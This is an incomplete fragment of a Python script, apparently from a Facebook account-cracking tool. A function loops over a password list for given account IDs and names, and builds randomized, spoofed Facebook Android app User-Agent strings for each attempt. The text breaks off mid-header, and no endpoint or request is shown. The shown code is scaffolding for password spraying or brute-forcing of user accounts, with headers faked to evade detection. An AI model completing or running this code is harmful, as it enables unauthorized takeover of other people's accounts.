...
def m2(ids,names,passlist):
    ...
    try:
        ...
        for pw in passlist:
            ...
            headers={
                    'User-Agent': f"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,80000000)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=2.25,width=720,height=1280};FBLC/fr_FR;FBRV/817101088;FBCR/Smartfren;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.MobileAdsManagerAndroid;FBDV/CPH2043;FBSV/12;FBOP/5;FBCA/armeabi-v7a;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(10000000,99999999))+";FBDM/{density=3.0,width=1080,height=2076};FBLC/de_DE;FBRV/870425191;FBCR/Rakuten;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.orca|Orca-Android;FBDV/RMX3115;FBSV/11;FBOP/7;FBCA/armeabi-v7a;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=1.5,width=480,height=800};FBLC/de_DE;FBRV/976315717;FBCR/Orange;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.MobileAdsManagerAndroid;FBDV/RMX1992;FBSV/14;FBOP/5;FBCA/arm64-v8a;]"%(fbpnn),
              'Content-Type': 'application/x-www-form-urlencoded', 
